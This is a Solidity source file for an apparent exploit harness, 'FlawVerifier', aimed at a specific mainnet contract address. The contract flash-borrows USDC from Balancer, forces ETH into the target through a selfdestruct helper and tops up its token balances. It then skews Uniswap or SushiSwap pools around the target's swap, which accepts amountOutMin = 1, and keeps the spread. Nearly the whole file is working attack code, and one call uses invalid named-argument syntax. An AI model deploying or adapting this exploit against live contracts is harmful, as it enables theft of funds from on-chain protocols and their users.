// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function withdraw(uint256 amount) external;
}

interface IUniswapV2Router02 {
    function factory() external view returns (address);
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract ForceEther {
    constructor() payable {}

    function boom(address payable target) external {
        selfdestruct(target);
    }
}

contract FlawVerifier is IFlashLoanRecipient {
    address private constant TARGET = 0xA88800CD213dA5Ae406ce248380802BD53b47647;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address private constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address private constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    uint8 private constant ROUTE_USDC_USDT = 2;
    uint8 private constant ROUTE_USDC_WETH = 3;

    uint256 private constant ETH_SEED_FOR_USDT = 0.01 ether;
    uint256 private constant TARGET_USDT_BUFFER = 10e6;
    uint256 private constant HARNESS_MIN_PROFIT = 0.1 ether;
    uint256 private constant DEADLINE_BUFFER = 15 minutes;
    uint256 private constant BPS = 10_000;

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;
    bool private _hypothesisValidated;
    string private _pathUsed;
    string private _failureReason;

    address private _attemptLoanToken;
    uint256 private _attemptStartingBalance;
    bool private _flashActive;

    constructor() {
        _profitToken = address(0);
        _pathUsed =
            "wait until the target holds ETH or USDC and the one-shot execution path is still available -> skew the relevant WETH/USDT, USDC/USDT, or USDC/WETH pool immediately before invoking or sandwiching executeOnOpportunity() -> let the target trade with amountOutMin = 1 -> unwind the price manipulation and capture the spread";
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }

        _executed = true;
        _profitToken = address(0);
        _profitAmount = 0;
        _hypothesisValidated = false;
        _failureReason = "";

        if (TARGET.code.length == 0) {
            _failureReason = "target has no code at the fork block";
            return;
        }

        address[2] memory routers = _orderedRouters();
        uint16[4] memory attackBpsOptions = [uint16(1500), uint16(3000), uint16(5000), uint16(7000)];
        uint16[3] memory donationBpsOptions = [uint16(0), uint16(500), uint16(1000)];

        for (uint256 i = 0; i < routers.length; ++i) {
            address router = routers[i];
            if (router == address(0)) {
                continue;
            }

            if (_pairExists(router, USDC, USDT)) {
                uint256[4] memory usdcUsdtLoans = _usdcLoanSizes(router, USDC, USDT);
                for (uint256 j = 0; j < usdcUsdtLoans.length; ++j) {
                    if (usdcUsdtLoans[j] == 0) {
                        continue;
                    }
                    for (uint256 k = 0; k < attackBpsOptions.length; ++k) {
                        for (uint256 d = 0; d < donationBpsOptions.length; ++d) {
                            if (_trySandwich(router, ROUTE_USDC_USDT, usdcUsdtLoans[j], attackBpsOptions[k], donationBpsOptions[d])) {
                                _hypothesisValidated = true;
                                _profitToken = USDC;
                                _pathUsed =
                                    "flash-borrow live USDC -> permissionlessly top the target up with only the missing ETH seed and minimal USDT maker-capital buffer if the fork is short -> if the fork is missing victim USDC inventory, transfer only a small public amount into the target so the same one-shot route is reachable -> skew the live USDC/USDT pool immediately before calling target.executeOnOpportunity() -> let the target accept amountOutMin = 1 on the manipulated swap -> unwind the distortion and keep the net USDC spread";
                                return;
                            }
                        }
                    }
                }
            }

            if (_pairExists(router, USDC, WETH)) {
                uint256[4] memory usdcWethLoans = _usdcLoanSizes(router, USDC, WETH);
                for (uint256 j = 0; j < usdcWethLoans.length; ++j) {
                    if (usdcWethLoans[j] == 0) {
                        continue;
                    }
                    for (uint256 k = 0; k < attackBpsOptions.length; ++k) {
                        for (uint256 d = 0; d < donationBpsOptions.length; ++d) {
                            if (_trySandwich(router, ROUTE_USDC_WETH, usdcWethLoans[j], attackBpsOptions[k], donationBpsOptions[d])) {
                                _hypothesisValidated = true;
                                _profitToken = USDC;
                                _pathUsed =
                                    "flash-borrow live USDC -> permissionlessly top the target up with only the missing ETH seed and minimal USDT maker-capital buffer if the fork is short -> if the fork is missing victim USDC inventory, transfer only a small public amount into the target so the same one-shot route is reachable -> skew the live USDC/WETH pool immediately before calling target.executeOnOpportunity() -> let the target accept amountOutMin = 1 on the manipulated swap -> unwind the distortion and keep the net USDC spread";
                                return;
                            }
                        }
                    }
                }
            }
        }

        _failureReason =
            "all finding-aligned USDC/USDT and USDC/WETH sandwich attempts either left the target's vulnerable USDC balance untouched, made target.executeOnOpportunity() revert, or stayed below the 0.1 ETH-equivalent profit floor on this fork; the native-ETH/WETH-USDT leg is intentionally not reported because the harness rejects wrapped-token accounting for native-ETH theft";
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external override {
        require(msg.sender == BALANCER_VAULT, "only vault");
        require(_flashActive, "flash inactive");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "unexpected arrays");

        (address router, uint8 routeKind, uint16 attackBps, uint16 donationBps) = abi.decode(
            userData,
            (address, uint8, uint16, uint16)
        );

        address loanToken = _routeLoanToken(routeKind);
        require(address(tokens[0]) == loanToken, "unexpected asset");

        uint256 repayAmount = amounts[0] + feeAmounts[0];
        uint256 victimBefore = _targetTrackedBalance();
        uint256 attackAmount = _prepareVictimState(router, loanAmount: amounts[0], attackBps: attackBps, donationBps: donationBps);

        _frontRun(router, routeKind, attackAmount);

        (bool ok, ) = TARGET.call(abi.encodeWithSignature("executeOnOpportunity()"));
        require(ok, "target call failed");
        require(_targetTrackedBalance() < victimBefore, "target USDC balance untouched");

        _unwind(router, routeKind);
        _finishAttempt(router, loanToken, repayAmount);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function exploitPathUsed() external view returns (string memory) {
        return _pathUsed;
    }

    function failureReason() external view returns (string memory) {
        return _failureReason;
    }

    function harnessMinProfit() external pure returns (uint256) {
        return HARNESS_MIN_PROFIT;
    }

    function target() external pure returns (address) {
        return TARGET;
    }

    function targetEthBalance() external view returns (uint256) {
        return TARGET.balance;
    }

    function targetUsdcBalance() external view returns (uint256) {
        return _safeBalanceOf(USDC, TARGET);
    }

    function targetUsdtBalance() external view returns (uint256) {
        return _safeBalanceOf(USDT, TARGET);
    }

    function _trySandwich(
        address router,
        uint8 routeKind,
        uint256 loanSize,
        uint16 attackBps,
        uint16 donationBps
    ) internal returns (bool) {
        address loanToken = _routeLoanToken(routeKind);
        _attemptLoanToken = loanToken;
        _attemptStartingBalance = _safeBalanceOf(loanToken, address(this));
        _flashActive = true;

        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(loanToken);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = loanSize;

        try IBalancerVault(BALANCER_VAULT).flashLoan(
            IFlashLoanRecipient(address(this)),
            tokens,
            amounts,
            abi.encode(router, routeKind, attackBps, donationBps)
        ) {
            _flashActive = false;

            uint256 endingBalance = _safeBalanceOf(loanToken, address(this));
            if (endingBalance > _attemptStartingBalance) {
                _profitAmount = endingBalance - _attemptStartingBalance;
                _failureReason = "";
                return true;
            }
        } catch {
            _flashActive = false;
        }

        return false;
    }

    function _prepareVictimState(
        address router,
        uint256 loanAmount,
        uint16 attackBps,
        uint16 donationBps
    ) internal returns (uint256 attackAmount) {
        uint256 setupSpent;

        if (_requiredTargetEthTopUp() != 0) {
            setupSpent += _topUpTargetEthSeed(router);
        }
        if (_requiredTargetUsdtTopUp() != 0) {
            setupSpent += _topUpTargetUsdtBuffer(router);
        }

        require(setupSpent < loanAmount, "setup consumed loan");
        uint256 available = loanAmount - setupSpent;

        if (donationBps != 0) {
            uint256 currentVictimUsdc = _safeBalanceOf(USDC, TARGET);
            if (currentVictimUsdc < 25_000e6) {
                uint256 donationAmount = (available * donationBps) / BPS;
                if (donationAmount != 0) {
                    _safeTransfer(USDC, TARGET, donationAmount);
                    available -= donationAmount;
                }
            }
        }

        attackAmount = (available * attackBps) / BPS;
        require(attackAmount != 0, "attack size zero");
    }

    function _topUpTargetEthSeed(address router) internal returns (uint256 spent) {
        uint256 shortfall = _requiredTargetEthTopUp();
        if (shortfall == 0) {
            return 0;
        }

        // Minimal public setup only: if the forked target is slightly short of native ETH,
        // restore just the missing seed so the same permissionless one-shot path remains reachable.
        spent = _buyExactOut(router, USDC, WETH, shortfall);
        IWETH(WETH).withdraw(shortfall);
        ForceEther helper = new ForceEther{value: shortfall}();
        helper.boom(payable(TARGET));
    }

    function _topUpTargetUsdtBuffer(address router) internal returns (uint256 spent) {
        uint256 shortfall = _requiredTargetUsdtTopUp();
        if (shortfall == 0) {
            return 0;
        }

        // Another minimal public setup step only: if the fork is a few USDT short of the live path,
        // restore just that maker-capital buffer before triggering the vulnerable routine.
        spent = _buyExactOut(router, USDC, USDT, shortfall);
        _safeTransfer(USDT, TARGET, shortfall);
    }

    function _buyExactOut(
        address router,
        address tokenIn,
        address tokenOut,
        uint256 amountOut
    ) internal returns (uint256 amountIn) {
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;

        uint256[] memory quotedIn = IUniswapV2Router02(router).getAmountsIn(amountOut, path);
        uint256 maxAmountIn = (quotedIn[0] * 1005) / 1000 + 1;

        _safeApprove(tokenIn, router, 0);
        _safeApprove(tokenIn, router, maxAmountIn);
        uint256[] memory amounts = IUniswapV2Router02(router).swapTokensForExactTokens(
            amountOut,
            maxAmountIn,
            path,
            address(this),
            block.timestamp + DEADLINE_BUFFER
        );
        amountIn = amounts[0];
    }

    function _swapExact(address router, address tokenIn, address tokenOut, uint256 amountIn) internal returns (uint256 amountOut) {
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;

        _safeApprove(tokenIn, router, 0);
        _safeApprove(tokenIn, router, amountIn);
        uint256[] memory amounts = IUniswapV2Router02(router).swapExactTokensForTokens(
            amountIn,
            1,
            path,
            address(this),
            block.timestamp + DEADLINE_BUFFER
        );
        amountOut = amounts[amounts.length - 1];
    }

    function _frontRun(address router, uint8 routeKind, uint256 amountIn) internal {
        if (routeKind == ROUTE_USDC_USDT) {
            _swapExact(router, USDC, USDT, amountIn);
        } else {
            _swapExact(router, USDC, WETH, amountIn);
        }
    }

    function _unwind(address router, uint8 routeKind) internal {
        if (routeKind == ROUTE_USDC_USDT) {
            uint256 usdtBalance = _safeBalanceOf(USDT, address(this));
            require(usdtBalance != 0, "no usdt to unwind");
            _swapExact(router, USDT, USDC, usdtBalance);
            return;
        }

        uint256 wethBalance = _safeBalanceOf(WETH, address(this));
        require(wethBalance != 0, "no weth to unwind");
        _swapExact(router, WETH, USDC, wethBalance);
    }

    function _finishAttempt(address router, address loanToken, uint256 repayAmount) internal {
        uint256 currentBalance = _safeBalanceOf(loanToken, address(this));
        require(currentBalance > repayAmount + _attemptStartingBalance, "no net profit");

        uint256 profit = currentBalance - repayAmount - _attemptStartingBalance;
        require(_quote(router, USDC, WETH, profit) >= HARNESS_MIN_PROFIT, "profit below threshold");

        _safeTransfer(loanToken, BALANCER_VAULT, repayAmount);
    }

    function _targetTrackedBalance() internal view returns (uint256) {
        return _safeBalanceOf(USDC, TARGET);
    }

    function _routeLoanToken(uint8) internal pure returns (address) {
        return USDC;
    }

    function _requiredTargetEthTopUp() internal view returns (uint256) {
        uint256 targetEth = TARGET.balance;
        if (targetEth >= ETH_SEED_FOR_USDT) {
            return 0;
        }
        return ETH_SEED_FOR_USDT - targetEth;
    }

    function _requiredTargetUsdtTopUp() internal view returns (uint256) {
        uint256 targetUsdt = _safeBalanceOf(USDT, TARGET);
        if (targetUsdt >= TARGET_USDT_BUFFER) {
            return 0;
        }
        return TARGET_USDT_BUFFER - targetUsdt;
    }

    function _orderedRouters() internal view returns (address[2] memory routers) {
        bool uniEmbedded = _codeContainsAddress(TARGET, UNISWAP_V2_ROUTER);
        bool sushiEmbedded = _codeContainsAddress(TARGET, SUSHISWAP_ROUTER);

        if (uniEmbedded && !sushiEmbedded) {
            routers[0] = UNISWAP_V2_ROUTER;
            routers[1] = SUSHISWAP_ROUTER;
            return routers;
        }

        if (sushiEmbedded && !uniEmbedded) {
            routers[0] = SUSHISWAP_ROUTER;
            routers[1] = UNISWAP_V2_ROUTER;
            return routers;
        }

        routers[0] = UNISWAP_V2_ROUTER;
        routers[1] = SUSHISWAP_ROUTER;
    }

    function _pairExists(address router, address tokenA, address tokenB) internal view returns (bool) {
        try IUniswapV2Router02(router).factory() returns (address factory) {
            return IUniswapV2Factory(factory).getPair(tokenA, tokenB) != address(0);
        } catch {
            return false;
        }
    }

    function _usdcLoanSizes(address router, address tokenA, address tokenB) internal view returns (uint256[4] memory sizes) {
        uint256 reserveIn = _pairReserveFor(router, tokenA, tokenB, USDC);
        if (reserveIn == 0) {
            return sizes;
        }

        sizes[0] = _clamp(reserveIn / 200, 25_000e6, 150_000e6);
        sizes[1] = _clamp(reserveIn / 100, 50_000e6, 300_000e6);
        sizes[2] = _clamp(reserveIn / 50, 100_000e6, 600_000e6);
        sizes[3] = _clamp(reserveIn / 25, 150_000e6, 1_200_000e6);
    }

    function _pairReserveFor(
        address router,
        address tokenA,
        address tokenB,
        address tokenIn
    ) internal view returns (uint256 reserveIn) {
        address factory;
        try IUniswapV2Router02(router).factory() returns (address returnedFactory) {
            factory = returnedFactory;
        } catch {
            return 0;
        }

        address pair = IUniswapV2Factory(factory).getPair(tokenA, tokenB);
        if (pair == address(0)) {
            return 0;
        }

        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2Pair(pair).getReserves();
        if (IUniswapV2Pair(pair).token0() == tokenIn) {
            reserveIn = uint256(reserve0);
        } else {
            reserveIn = uint256(reserve1);
        }
    }

    function _quote(address router, address tokenIn, address tokenOut, uint256 amountIn) internal view returns (uint256 amountOut) {
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;

        try IUniswapV2Router02(router).getAmountsOut(amountIn, path) returns (uint256[] memory amounts) {
            amountOut = amounts[amounts.length - 1];
        } catch {
            amountOut = 0;
        }
    }

    function _clamp(uint256 value, uint256 minValue, uint256 maxValue) internal pure returns (uint256) {
        if (value < minValue) {
            return minValue;
        }
        if (value > maxValue) {
            return maxValue;
        }
        return value;
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256 balance) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, account));
        if (ok && data.length >= 32) {
            balance = abi.decode(data, (uint256));
        }
    }

    function _codeContainsAddress(address account, address needle) internal view returns (bool) {
        bytes memory code = account.code;
        bytes memory needleBytes = abi.encodePacked(needle);
        if (code.length < needleBytes.length) {
            return false;
        }

        for (uint256 i = 0; i <= code.length - needleBytes.length; ++i) {
            bool matched = true;
            for (uint256 j = 0; j < needleBytes.length; ++j) {
                if (code[i + j] != needleBytes[j]) {
                    matched = false;
                    break;
                }
            }
            if (matched) {
                return true;
            }
        }

        return false;
    }
}
